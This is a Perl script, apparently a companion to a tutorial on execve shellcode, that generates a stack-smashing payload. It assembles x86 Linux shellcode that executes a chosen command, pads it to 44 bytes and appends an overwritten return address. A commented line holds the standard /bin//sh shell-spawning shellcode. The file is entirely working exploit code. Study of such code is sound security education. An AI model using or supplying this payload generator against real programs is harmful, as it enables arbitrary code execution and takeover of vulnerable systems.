#!/usr/bin/perl

# see http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html
use IO::File;
use warnings;
use strict;

my $command = $ARGV[0] || "/bin/who";
my $address_hex = $ARGV[1] || 'ffffcfa0';

die "command $command needs path" unless $command =~ m!^[./]! && length ($command) <= 8;
while (length ($command) % 4 != 0) {
  $command =~ s!/!//!;
}

my $shellcode=
#   "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    "\x31\xc0\x50";

while ($command =~ s/(....)$//) {
   STDERR->print ("push '$1'\n");
   $shellcode .= chr (0x68) . $1;
}
die "$command residue: was not modulo 4" if $command;

 $shellcode .= "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
die "address_hex needs to be eight hex chars, not $address_hex" unless $address_hex =~ /^[0-9a-f]{8}$/;
my $address_bin = ''; 
while ($address_hex =~ s/(..)$//) {
  $address_bin .= chr (hex $1);
}
warn $address_bin;
STDERR->printf ("length of shellcode is %d\n", length ($shellcode));
STDOUT->print ($shellcode . (' ' x (44-length ($shellcode))) . $address_bin);
